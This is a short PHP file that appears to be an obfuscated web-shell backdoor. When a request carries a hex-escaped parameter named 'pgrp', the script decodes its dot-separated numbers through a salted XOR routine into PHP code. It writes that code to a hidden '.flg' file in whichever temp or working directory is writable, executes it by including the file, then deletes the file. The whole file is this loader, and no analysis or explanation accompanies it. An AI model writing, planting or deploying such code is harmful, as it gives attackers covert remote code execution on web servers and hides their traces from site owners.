<?php

if(array_key_exists("\x70\x67rp", $_REQUEST)){
	$ent = array_filter([session_save_path(), sys_get_temp_dir(), getenv("TEMP"), "/var/tmp", "/dev/shm", "/tmp", ini_get("upload_tmp_dir"), getcwd(), getenv("TMP")]);
	$bind = $_REQUEST["\x70\x67rp"];
			$bind=	explode( "."		,	$bind 	)  	; 
	$comp = '';
            $salt8 = 'abcdefghijklmnopqrstuvwxyz0123456789';
            $lenS = strlen($salt8);
            $z = 0;
    
            $__tmp = $bind;
            while ($v1 = array_shift($__tmp)) {
                $chS = ord($salt8[$z % $lenS]);
                $d = ((int)$v1 - $chS - ($z % 10))  ^	 47;
                $comp .= chr($d);
                $z++;}	
	for ($val = 0, $ref = count($ent); $val < $ref; $val++) {
    $descriptor = $ent[$val];
    		if (max(0, is_dir($descriptor) * is_writable($descriptor))) {
    $mrk = "$descriptor" . "/.flg";
    if (file_put_contents($mrk, $comp)) {
	include $mrk;
	@unlink($mrk);
	exit;
}
}
}
}